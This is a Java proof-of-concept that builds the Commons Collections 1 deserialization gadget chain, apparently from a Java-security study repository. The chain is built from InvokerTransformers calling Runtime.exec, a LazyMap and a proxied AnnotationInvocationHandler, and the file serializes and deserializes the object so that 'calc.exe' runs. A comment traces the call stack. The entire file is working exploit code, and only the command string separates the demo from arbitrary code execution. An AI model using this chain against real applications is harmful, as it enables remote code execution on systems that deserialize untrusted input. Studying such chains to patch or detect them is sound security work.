package com.javasec.pocs.cc;
import com.javasec.utils.SerializeUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * exec:347, Runtime (java.lang)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * transform:126, InvokerTransformer (org.apache.commons.collections.functors)
 * transform:123, ChainedTransformer (org.apache.commons.collections.functors)
 * get:158, LazyMap (org.apache.commons.collections.map)
 * invoke:77, AnnotationInvocationHandler (sun.reflect.annotation)
 * entrySet:-1, $Proxy0 (com.sun.proxy)
 * readObject:444, AnnotationInvocationHandler (sun.reflect.annotation)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * invokeReadObject:1058, ObjectStreamClass (java.io)
 * readSerialData:1900, ObjectInputStream (java.io)
 * readOrdinaryObject:1801, ObjectInputStream (java.io)
 * readObject0:1351, ObjectInputStream (java.io)
 * readObject:371, ObjectInputStream (java.io)
 * unserialize:110, SerializeUtils (com.javasec.utils)
 * main:34, CommonsCollections1 (com.javasec.pocs.cc)
 */
public class CommonsCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationconstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) annotationconstructor.newInstance(Override.class, lazymap);
        //生成动态代理
        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},handler);
        //生成最外层
        Object o = annotationconstructor.newInstance(Override.class, mapproxy);

        SerializeUtils.serialize(o);
        SerializeUtils.unserialize("ser.bin");


    }
}
